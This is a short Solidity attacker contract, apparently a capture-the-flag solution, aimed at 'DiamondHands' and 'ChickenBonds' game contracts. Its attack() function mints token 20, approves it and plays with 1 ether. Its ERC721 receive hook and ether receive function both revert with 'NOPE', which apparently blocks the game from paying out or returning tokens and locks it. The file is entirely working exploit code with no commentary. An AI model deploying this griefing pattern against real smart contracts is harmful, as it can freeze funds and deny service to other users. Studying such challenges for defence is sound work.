// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.15;

import {DiamondHands, ChickenBonds} from "./DiamondHands.sol";

contract DiamondHandsAttacker {
    DiamondHands public diamond;
    ChickenBonds public chicken;

    constructor(address chickencontract, address diamondcontract) {
        diamond = DiamondHands(diamondcontract);
        chicken = ChickenBonds(chickencontract);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        revert("NOPE");
    }

    receive() external payable {
        revert("NOPE");
    }

    function attack() public payable {
        uint256 tokenId = 20;
        chicken.FryChicken(address(this), tokenId);
        chicken.approve(address(diamond), tokenId);
        diamond.playDiamondHands{value: 1 ether}(tokenId);
    }
}
